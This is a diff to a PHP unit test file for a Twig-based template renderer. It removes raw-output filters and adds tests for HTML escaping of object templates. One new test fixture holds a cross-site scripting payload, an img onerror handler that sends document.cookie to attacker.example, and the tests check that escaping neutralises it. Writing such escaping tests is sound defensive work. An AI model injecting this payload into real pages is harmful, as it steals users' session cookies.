@@ -176,12 +176,13 @@ class ViewTest extends TestCase
      * @param string $template
      * @param mixed $object
      * @param array $variables
+     * @param string|false $escaperStrategy
      * @throws Exception
      * @throws Throwable
      */
-    public function testRenderObjectTemplate(string $expected, string $template, mixed $object, array $variables = []): void
+    public function testRenderObjectTemplate(string $expected, string $template, mixed $object, array $variables = [], string|false $escaperStrategy = false): void
     {
-        self::assertSame($expected, $this->view->renderObjectTemplate($template, $object, $variables));
+        self::assertSame($expected, $this->view->renderObjectTemplate($template, $object, $variables, escaperStrategy: $escaperStrategy));
     }
 
     /**
@@ -438,22 +439,22 @@ TWIG;
     {
         return [
             ['{{ object.titleWithHyphens|replace({\'-\': \'!\'}) }}', '{{ object.titleWithHyphens|replace({\'-\': \'!\'}) }}'],
-            ['{{ (_variables.foo ?? object.foo)|raw }}', '{foo}'],
-            ['{{ (_variables.foo ?? object.foo).bar|raw }}', '{foo.bar}'],
+            ['{{ (_variables.foo ?? object.foo) }}', '{foo}'],
+            ['{{ (_variables.foo ?? object.foo).bar }}', '{foo.bar}'],
             ['{foo : \'bar\'}', '{foo : \'bar\'}'],
             ['{{foo}}', '{{foo}}'],
             ['{% foo %}', '{% foo %}'],
-            ['{{ (_variables.foo ?? object.foo).fn({bar: baz})|raw }}', '{foo.fn({bar: baz})}'],
-            ['{{ (_variables.foo ?? object.foo).fn({bar: {baz: 1}})|raw }}', '{foo.fn({bar: {baz: 1}})}'],
-            ['{{ (_variables.foo ?? object.foo).fn(\'bar:baz\')|raw }}', '{foo.fn(\'bar:baz\')}'],
-            ['{{ (_variables.foo ?? object.foo).fn({\'bar\': baz})|raw }}', '{foo.fn({\'bar\': baz})}'],
+            ['{{ (_variables.foo ?? object.foo).fn({bar: baz}) }}', '{foo.fn({bar: baz})}'],
+            ['{{ (_variables.foo ?? object.foo).fn({bar: {baz: 1}}) }}', '{foo.fn({bar: {baz: 1}})}'],
+            ['{{ (_variables.foo ?? object.foo).fn(\'bar:baz\') }}', '{foo.fn(\'bar:baz\')}'],
+            ['{{ (_variables.foo ?? object.foo).fn({\'bar\': baz}) }}', '{foo.fn({\'bar\': baz})}'],
             ['{% verbatim %}`{foo}`{% endverbatim %}', '`{foo}`'],
             ["{% verbatim %}`{foo}\n{bar}`{% endverbatim %}", "`{foo}\n{bar}`"],
             ["{% verbatim %}```\n{% exit %}\n```{% endverbatim %}", "```\n{% exit %}\n```"],
             ["{% verbatim %}````\n{% exit %}\n````{% endverbatim %}", "````\n{% exit %}\n````"],
             ["{% verbatim %}\n{foo}\n{% endverbatim %}", "{% verbatim %}\n{foo}\n{% endverbatim %}"],
             ["{%- verbatim -%}\n{foo}\n{%- endverbatim -%}", "{%- verbatim -%}\n{foo}\n{%- endverbatim -%}"],
-            ['{{ clone(productCategory).level(1).one().slug|raw }}', '{clone(productCategory).level(1).one().slug}'],
+            ['{{ clone(productCategory).level(1).one().slug }}', '{clone(productCategory).level(1).one().slug}'],
             ['{{ #{foo} }}', '{{ #{foo} }}'],
             ['{% set string = "test #{foo} 5" %}{{string}}', '{% set string = "test #{foo} 5" %}{{string}}'],
         ];
@@ -515,6 +516,9 @@ TWIG;
         $arrayable->exampleArrayableParam = 'Example param';
         $arrayable->extraField = 'ExtraField';
 
+        $htmlModel = new ExampleModel();
+        $htmlModel->exampleParam = "<img src=x onerror=\"fetch('//attacker.example/c?c='+document.cookie)\">";
+
         return [
             // No tags. Then it returns the template
             ['[[ exampleParam ]]', '[[ exampleParam ]]', $model, ['vars' => 'vars']],
@@ -536,6 +540,12 @@ TWIG;
             // Make sure resulting templates are trimmed
             ['foo', ' foo ', $model],
             ['Example Param', ' {exampleParam}', $model],
+
+            // Test HTML escaping
+            // (The templates need to be unique, as the escape() call won't be added to the compiled template
+            // if there's no default escaper included on the first render, so they can't share compiled templates.)
+            ["<img src=x onerror=\"fetch('//attacker.example/c?c='+document.cookie)\">@1", '{exampleParam}@1', $htmlModel],
+            ["&lt;img src=x onerror=&quot;fetch(&#039;//attacker.example/c?c=&#039;+document.cookie)&quot;&gt;@2", '{exampleParam}@2', $htmlModel, [], 'html'],
         ];
     }
 
